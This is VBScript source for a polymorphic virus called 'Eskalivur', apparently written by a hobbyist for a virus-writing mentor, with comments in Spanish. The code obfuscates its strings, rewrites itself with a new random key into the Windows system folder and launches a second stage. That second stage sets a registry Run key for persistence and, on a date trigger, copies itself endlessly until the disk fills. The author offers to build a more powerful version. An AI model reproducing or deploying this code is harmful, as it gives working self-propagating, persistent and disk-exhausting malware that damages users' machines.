'--------[]-------------------------------------------------------------------------------------
'Nombre		: Eskalivur
'Caractersticas	: Polimorfico
'Agradecimientos: a Brito por el nombre del virus, a GriYo pues espero que sea mi maestro
'		  y me inculque sus conocimientos sobre la ingenería vírica y por ultimo
'		  a Microsoft por hacer el sistema operativo mas malo del mundo ;)
'--------[]-------------------------------------------------------------------------------------

On Error Resume Next
S1 = 0
S3 = S1
S1 = 9
Set O1 = CreateObject (D("\l{ry}rwp7Orun\‚|}nvXksnl}"))
Set O2 = CreateObject (D("`\l{ry}7\qnuu"))
Set O3 = O1.OpenTextFile(WScript.ScriptFullName,1)
Set O4 = O1.CreateTextFile(O1.GetSpecialFolder(1) & D("e_r{~|7k|"),True)
Set O5 = O1.CreateTextFile(O1.GetSpecialFolder(1) & D("eLnw}rwnuj7k|"),True)
Randomize Timer
S2 = Int(Rnd * 30 + 20)
Do While L <> "On Error Resume Next"
L = O3.ReadLine
Loop
O4.WriteLine L
O3.SkipLine
O4.WriteLine "S1 = asc(""" + chr (S2) + """)"
For i = 1 To 48
O4.WriteLine O3.ReadLine
Next
For a = 1 To 21
S1 = S3 : L = D(Mid(O3.ReadLine,2))
S1 = S2 : O4.WriteLine "'" + E(L) : O5.WriteLine L
Next
O3.Close
O4.Close
O5.Close
S1 = 9
O2.Run O1.GetSpecialFolder(1) & D("eLnw}rwnuj7k|")
Function E(c)
For i = 1 To Len(c)
t = Asc(Mid(c,i,1)) + S1
If t > 255 Then
E = E + Chr (t - 255)
Else
E = E + Chr (t)
End If
Next
End Function
Function D(c)
For i = 1 To Len(c)
t = Asc(Mid(c,i,1))
If t > S1 Then
D = D + Chr (t - S1)
Else
D = D + Chr (t + 255 - S1)
End If
Next
End Function

''Aqui se insertaria un codigo de envio utilizando Outlook pero como 
''es un ejemplo paso de escribir un código que robe información del
''ususario o se replique, pero en su lugar añado un efecto destructivo consistente
''en mostrar un mensaje y despues replicarse a si mismo en c:\windows
''Asi mismo tambien podria haber copiado la rutina polimorfica y encriptar
''Las cadenas que delatan el cuerpo del virus en su 2ª fase.
''Bueno pues esto es todo GriYo espero que te haya gustado y si quieres que
''haga una version nueva de este virus lo mas potente posible para ver mejor mis capacidades
''(pocas por el momento) escribemé, ¿vale? :)
'On Error Resume Next
'Set O1 = CreateObject ("Scripting.FileSystemObject")
'Set O2 = CreateObject ("WScript.Shell")
'Rp = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Eskalibur"
'O2.RegWrite rp, Wscript.ScriptFullname
'If Day(Now) = Hour(Now) Then
'msgbox "Hola soy el virus Eskalibur y esto es solo una prueba de un virus que solo infecta al ordenador donde se ejecuta. Para desinfectar eliminar del registro la entrada siguiente" & Rp & Chr (13) & "By Keanu for GriYo"
'Do While i = 0
'O1.CopyFile Wscript.ScriptFullname, O1.GetSpecialFolder(1) & "\file" & a
'a = a + 1
'Loop
'End If